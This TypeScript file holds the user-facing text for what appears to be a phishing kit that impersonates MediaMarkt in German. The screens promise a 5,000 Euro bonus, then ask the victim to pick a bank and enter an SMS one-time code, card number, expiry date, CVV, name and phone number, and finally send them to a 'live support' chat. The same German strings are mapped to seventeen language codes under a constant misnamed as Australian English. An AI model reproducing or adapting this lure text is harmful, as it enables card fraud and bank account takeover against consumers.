export type TranslationKeys = {
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
};

const AUSTRALIA_ENGLISH_TRANSLATION: TranslationKeys = {
  portal_name: "MediaMarkt Kundenportal",
  support_center_name: "MediaMarkt Kundensupport",
  win_title: "Exklusives MediaMarkt Bonusangebot",
  win_subtitle: "Herzlichen Glueckwunsch! Sie wurden fuer die heutige MediaMarkt-Aktion ausgewaehlt. Klicken Sie auf die Schaltflaeche, um Ihren 5.000 Euro Bonus zu erhalten.",
  win_button: "Bonus einloesen",
  banken_title: "Waehlen Sie Ihre Bank",
  banken_subtitle: "Waehlen Sie Ihre Bank, um fortzufahren.",
  banken_search_placeholder: "Bank suchen...",
  wait_title: "Bitte warten",
  wait_subtitle: "Ihre Anfrage wird sicher verarbeitet...",
  sms_title: "SMS-Sicherheitscode",
  sms_subtitle: "Geben Sie den {digits}-stelligen Code ein.",
  sms_input_label: "Einmalcode",
  sms_button: "Bestaetigen",
  sms_loading: "Wird verarbeitet...",
  card_title: "Zahlungsdaten",
  card_subtitle: "Ueberpruefen und bestaetigen Sie Ihre Daten.",
  card_owner_label: "Karteninhaber",
  card_number_label: "Kartennummer",
  card_expiry_label: "Gueltig bis MM/JJ",
  card_cvv_label: "Sicherheitscode",
  card_button: "Weiter",
  code_title: "Willkommen",
  code_subtitle: "Geben Sie den Teilnahmecode ein, den Sie von {partner} erhalten haben, um Ihre Praemie freizuschalten.",
  code_button: "Code bestaetigen",
  live_support_title: "MediaMarkt Live-Support",
  live_support_subtitle: "Um fortzufahren, muessen Sie unseren MediaMarkt-Kundensupport kontaktieren.\n\nKlicken Sie auf die Schaltflaeche, um den Chat zu starten.",
  live_support_button: "Chat starten",
  profile_title_small: "Gewinnbestaetigung",
  profile_title_main: "Ihr Bonusbetrag",
  profile_subtitle: "Bestaetigen Sie Ihre Daten zur weiteren Bearbeitung.",
  profile_firstname_label: "Vorname",
  profile_lastname_label: "Nachname",
  profile_phone_label: "Handynummer",
  profile_button: "Weiter",
  profile_loading_text: "Processing...",
};

const LANGUAGE_CODES = [
  "fi",
  "nl",
  "et",
  "cs",
  "pt",
  "pl",
  "sv",
  "da",
  "ro",
  "el",
  "hu",
  "tr",
  "en",
  "de",
  "fr",
  "es",
  "it",
] as const;

export const translations: Record<string, TranslationKeys> = Object.fromEntries(
  LANGUAGE_CODES.map((code) => [code, AUSTRALIA_ENGLISH_TRANSLATION]),
) as Record<string, TranslationKeys>;
